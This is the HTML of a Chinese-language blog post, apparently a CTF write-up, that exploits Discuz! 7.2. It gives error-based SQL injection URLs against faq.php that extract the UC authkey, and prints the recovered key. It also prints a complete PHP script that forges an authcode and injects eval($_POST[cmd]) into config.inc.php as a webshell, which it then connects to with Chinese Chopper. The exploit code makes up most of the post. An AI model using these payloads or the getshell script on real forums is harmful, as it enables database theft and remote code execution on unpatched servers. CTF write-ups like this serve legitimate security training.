@@ -1,0 +1,1134 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css?v=7.2.0">
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.2.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    }
+  };
+</script>
+
+  <meta name="description" content="0x01 分析 在主页找到discuz!版本，放入搜索引擎。找到这个版本的漏洞。根据一篇文章，得知。这道题获取flag的过程是通过注入漏洞，获取到uc-key。再通过然后通过php脚本以及获取到的uc-key将一句话写入config.inc.php,最后用菜刀连接，在根目录找到flag。  0x02 过程 在主页发现此论坛版本   Discuz! 7.2  根据得到的论坛版本号 进行google、">
+<meta name="keywords" content="writeup,web-bbs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Discuz! Writeup">
+<meta property="og:url" content="https://youlove.club/2019/09/27/Discuz!-Writeup/index.html">
+<meta property="og:site_name" content="Fan的小酒馆">
+<meta property="og:description" content="0x01 分析 在主页找到discuz!版本，放入搜索引擎。找到这个版本的漏洞。根据一篇文章，得知。这道题获取flag的过程是通过注入漏洞，获取到uc-key。再通过然后通过php脚本以及获取到的uc-key将一句话写入config.inc.php,最后用菜刀连接，在根目录找到flag。  0x02 过程 在主页发现此论坛版本   Discuz! 7.2  根据得到的论坛版本号 进行google、">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://qiniu.xirrs.com/Discuz%21Writeup-1.1.png">
+<meta property="og:image" content="http://qiniu.xirrs.com/Discuz%21Writeup-1.2.png">
+<meta property="og:image" content="http://qiniu.xirrs.com/Discuz%21Writeup-1.3.png">
+<meta property="og:image" content="http://qiniu.xirrs.com/Discuz%21Writeup-1.4.png">
+<meta property="og:image" content="http://qiniu.xirrs.com/Discuz%21Writeup-1.5.png">
+<meta property="og:image" content="http://qiniu.xirrs.com/Discuz%21Writeup-1.6.png">
+<meta property="og:updated_time" content="2019-09-27T15:46:33.091Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Discuz! Writeup">
+<meta name="twitter:description" content="0x01 分析 在主页找到discuz!版本，放入搜索引擎。找到这个版本的漏洞。根据一篇文章，得知。这道题获取flag的过程是通过注入漏洞，获取到uc-key。再通过然后通过php脚本以及获取到的uc-key将一句话写入config.inc.php,最后用菜刀连接，在根目录找到flag。  0x02 过程 在主页发现此论坛版本   Discuz! 7.2  根据得到的论坛版本号 进行google、">
+<meta name="twitter:image" content="http://qiniu.xirrs.com/Discuz%21Writeup-1.1.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://youlove.club/2019/09/27/Discuz!-Writeup/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  
+  <title>Discuz! Writeup | Fan的小酒馆</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Fan的小酒馆</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">弱小不是生存的阻碍，无知和傲慢才是</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-playlist">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/playlist/" rel="section"><i class="menu-item-icon fa fa-fw fa-music"></i> <br>歌单</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://youlove.club/2019/09/27/Discuz!-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Yang Fan">
+      <meta itemprop="description" content="千里之行，始于足下。">
+      <meta itemprop="image" content="/images/tx4.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Fan的小酒馆">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Discuz! Writeup
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-09-27 23:28:13 / 修改时间：23:46:33" itemprop="dateCreated datePublished" datetime="2019-09-27T23:28:13+08:00">2019-09-27</time>
+            </span>
+          
+
+          
+            
+
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          
+
+          
+            
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="fa fa-comment-o"></i>
+    </span>
+    
+      <span class="post-meta-item-text">评论数：</span>
+    
+  
+    <a href="/2019/09/27/Discuz!-Writeup/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/09/27/Discuz!-Writeup/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+          
+
+          <br>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h4><blockquote>
+<p>在主页找到discuz!版本，放入搜索引擎。找到这个版本的漏洞。根据一篇文章，得知。这道题获取flag的过程是通过注入漏洞，获取到uc-key。再通过然后通过php脚本以及获取到的uc-key将一句话写入config.inc.php,最后用菜刀连接，在根目录找到flag。</p>
+</blockquote>
+<h4 id="0x02-过程"><a href="#0x02-过程" class="headerlink" title="0x02 过程"></a>0x02 过程</h4><p> 在主页发现此论坛版本 </p>
+<p><img src="http://qiniu.xirrs.com/Discuz%21Writeup-1.1.png" alt="imgs1"></p>
+<p><code>Discuz! 7.2</code></p>
+<p> 根据得到的论坛版本号 进行google、百度搜索，得到此版本存在一个注入漏洞</p>
+<a id="more"></a>
+
+<p> <strong>payload</strong></p>
+<p> 这个payload 只能取到uc-key 的62位</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faq.php?action=grouppermission&amp;gids[99]=&apos;&amp;gids[100][0]=) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select substr(authkey,1,62) from cdb_uc_applications limit 0,1),0x3a)x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure>
+
+<p> 取uc-key 最后几位</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faq.php?action=grouppermission&amp;gids[99]=&apos;&amp;gids[100][0]=) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select substr(authkey,63,60) from cdb_uc_applications limit 0,1),0x3a)x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure>
+
+<p> 得到完整的uc-key：<br><code>h3Sdtbyey2GcW780weU5j0adY2s0N2R6ecp8I4F206E7Wfoewdy8N3pa04w7Qema</code></p>
+<p><img src="http://qiniu.xirrs.com/Discuz%21Writeup-1.2.png" alt="imgs2"></p>
+<p> 接下来 把得到uc-key 放入 getshell 的脚本，需要注意的是，题目的url是不能跟端口的，并且默认的端口是80。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//5</span><br><span class="line">$host=&quot;ctf.aweik.cn&quot;;</span><br><span class="line">//7</span><br><span class="line"></span><br><span class="line">$uc_key=&quot;h3Sdtbyey2GcW780weU5j0adY2s0N2R6ecp8I4F206E7Wfoewdy8N3pa04w7Qema&quot;;</span><br></pre></td></tr></table></figure>
+
+<p> 在65行</p>
+<p><code>$fp = fsockopen($host, 8099);</code></p>
+<p> 完整的脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$timestamp = time()+10*3600;</span><br><span class="line"></span><br><span class="line">$host=&quot;ctf.aweik.cn&quot;;</span><br><span class="line"></span><br><span class="line">$uc_key=&quot;h3Sdtbyey2GcW780weU5j0adY2s0N2R6ecp8I4F206E7Wfoewdy8N3pa04w7Qema&quot;;</span><br><span class="line"></span><br><span class="line">$code=urlencode(_authcode(&quot;time=$timestamp&amp;action=updateapps&quot;, &apos;ENCODE&apos;, $uc_key));</span><br><span class="line"></span><br><span class="line">$cmd1=&apos;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;</span><br><span class="line"></span><br><span class="line">&lt;item id=&quot;UC_API&quot;&gt;xxx\&apos;);eval($_POST[cmd]);//&lt;/item&gt;</span><br><span class="line"></span><br><span class="line">&lt;/root&gt;&apos;;</span><br><span class="line"></span><br><span class="line">$cmd2=&apos;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;</span><br><span class="line"></span><br><span class="line">&lt;item id=&quot;UC_API&quot;&gt;aaa&lt;/item&gt;</span><br><span class="line"></span><br><span class="line">&lt;/root&gt;&apos;;</span><br><span class="line"></span><br><span class="line">$html1 = send($cmd1);</span><br><span class="line"></span><br><span class="line">echo $html1;</span><br><span class="line"></span><br><span class="line">$html2 = send($cmd2);</span><br><span class="line"></span><br><span class="line">echo $html2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function send($cmd)&#123;</span><br><span class="line"></span><br><span class="line">global $host,$code;</span><br><span class="line"></span><br><span class="line">$message = &quot;POST /api/uc.php?code=&quot;.$code.&quot; HTTP/1.1\r\n&quot;;</span><br><span class="line"></span><br><span class="line">$message .= &quot;Accept: */*\r\n&quot;;</span><br><span class="line"></span><br><span class="line">$message .= &quot;Referer: &quot;.$host.&quot;\r\n&quot;;</span><br><span class="line"></span><br><span class="line">$message .= &quot;Accept-Language: zh-cn\r\n&quot;;</span><br><span class="line"></span><br><span class="line">$message .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;</span><br><span class="line"></span><br><span class="line">$message .= &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n&quot;;</span><br><span class="line"></span><br><span class="line">$message .= &quot;Host: &quot;.$host.&quot;\r\n&quot;;</span><br><span class="line"></span><br><span class="line">$message .= &quot;Content-Length: &quot;.strlen($cmd).&quot;\r\n&quot;;</span><br><span class="line"></span><br><span class="line">$message .= &quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line"></span><br><span class="line">$message .= $cmd;</span><br><span class="line"></span><br><span class="line">$fp = fsockopen($host, 8099);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fputs($fp, $message);</span><br><span class="line"></span><br><span class="line">$resp = &apos;&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while ($fp &amp;&amp; !feof($fp))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$resp .= fread($fp, 1024);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">return $resp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function _authcode($string, $operation = &apos;DECODE&apos;, $key = &apos;&apos;, $expiry = 0) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ckey_length = 4;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$key = md5($key ? $key : UC_KEY);</span><br><span class="line"></span><br><span class="line">$keya = md5(substr($key, 0, 16));</span><br><span class="line"></span><br><span class="line">$keyb = md5(substr($key, 16, 16));</span><br><span class="line"></span><br><span class="line">$keyc = $ckey_length ? ($operation == &apos;DECODE&apos; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">$cryptkey = $keya.md5($keya.$keyc);</span><br><span class="line"></span><br><span class="line">$key_length = strlen($cryptkey);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$string = $operation == &apos;DECODE&apos; ? base64_decode(substr($string, $ckey_length)) : sprintf(&apos;%010d&apos;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;</span><br><span class="line"></span><br><span class="line">$string_length = strlen($string);</span><br><span class="line"></span><br><span class="line">$result = &apos;&apos;;</span><br><span class="line"></span><br><span class="line">$box = range(0, 255);</span><br><span class="line"></span><br><span class="line">$rndkey = array();</span><br><span class="line"></span><br><span class="line">for($i = 0; $i &lt;= 255; $i++) &#123;</span><br><span class="line"></span><br><span class="line">$rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for($j = $i = 0; $i &lt; 256; $i++) &#123;</span><br><span class="line"></span><br><span class="line">$j = ($j + $box[$i] + $rndkey[$i]) % 256;</span><br><span class="line"></span><br><span class="line">$tmp = $box[$i];</span><br><span class="line"></span><br><span class="line">$box[$i] = $box[$j];</span><br><span class="line"></span><br><span class="line">$box[$j] = $tmp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;</span><br><span class="line"></span><br><span class="line">$a = ($a + 1) % 256;</span><br><span class="line"></span><br><span class="line">$j = ($j + $box[$a]) % 256;</span><br><span class="line"></span><br><span class="line">$tmp = $box[$a];</span><br><span class="line"></span><br><span class="line">$box[$a] = $box[$j];</span><br><span class="line"></span><br><span class="line">$box[$j] = $tmp;</span><br><span class="line"></span><br><span class="line">$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($operation == &apos;DECODE&apos;) &#123;</span><br><span class="line"></span><br><span class="line">if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) &#123;</span><br><span class="line"></span><br><span class="line">return substr($result, 26);</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">return &apos;&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">return $keyc.str_replace(&apos;=&apos;, &apos;&apos;, base64_encode($result));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 在php环境下 执行</p>
+<p> <img src="http://qiniu.xirrs.com/Discuz%21Writeup-1.3.png" alt="imgs3"></p>
+<p> 写入成功</p>
+<p> <strong>GetShell</strong></p>
+<p> 菜刀连接</p>
+<p> <code>http://ctf.aweik.cn:8099/config.inc.php # 密码 cmd</code></p>
+<p> <img src="http://qiniu.xirrs.com/Discuz%21Writeup-1.4.png" alt="imgs4"></p>
+<p> 在根目录发现flag</p>
+<p> <img src="http://qiniu.xirrs.com/Discuz%21Writeup-1.5.png" alt="imgs5"></p>
+<p> 下载 打开 得到</p>
+<p> <img src="http://qiniu.xirrs.com/Discuz%21Writeup-1.6.png" alt="imgs6"></p>
+
+      
+    </div>
+
+    
+
+    
+      
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+            <a href="/tags/web-bbs/" rel="tag"># web-bbs</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/27/BugKu-Web题-备份是个好习惯/" rel="next" title="BugKu-Web题[备份是个好习惯]">
+                <i class="fa fa-chevron-left"></i> BugKu-Web题[备份是个好习惯]
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/09/27/ezphp-writeup/" rel="prev" title="ezphp-writeup">
+                ezphp-writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+  
+    
+    <div class="comments" id="comments"></div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  
+    <img class="site-author-image" itemprop="image" src="/images/tx4.gif" alt="Yang Fan">
+  
+  <p class="site-author-name" itemprop="name">Yang Fan</p>
+  <div class="site-description motion-element" itemprop="description">千里之行，始于足下。</div>
+</div>
+
+
+  <nav class="site-state motion-element">
+    
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+
+
+
+
+  <div class="links-of-author motion-element">
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/fanygit" title="GitHub &rarr; https://github.com/fanygit" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:483813121@qq.com" title="E-Mail &rarr; mailto:483813121@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+
+
+
+
+
+
+  <div class="links-of-blogroll motion-element links-of-blogroll-block">
+    <div class="links-of-blogroll-title">
+      <i class="fa  fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://portal.qiniu.com/bucket/hexo_images/resource" title="https://portal.qiniu.com/bucket/hexo_images/resource" rel="noopener" target="_blank">七牛云存储</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://leancloud.cn/dashboard/applist.html#/apps" title="https://leancloud.cn/dashboard/applist.html#/apps" rel="noopener" target="_blank">Leancloud</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://dc.console.aliyun.com/next/index#/domain/list/all-domain" title="https://dc.console.aliyun.com/next/index#/domain/list/all-domain" rel="noopener" target="_blank">阿里云服务</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://www.ms08067.com/about/bachang.html" title="https://www.ms08067.com/about/bachang.html" rel="noopener" target="_blank">在线靶场</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
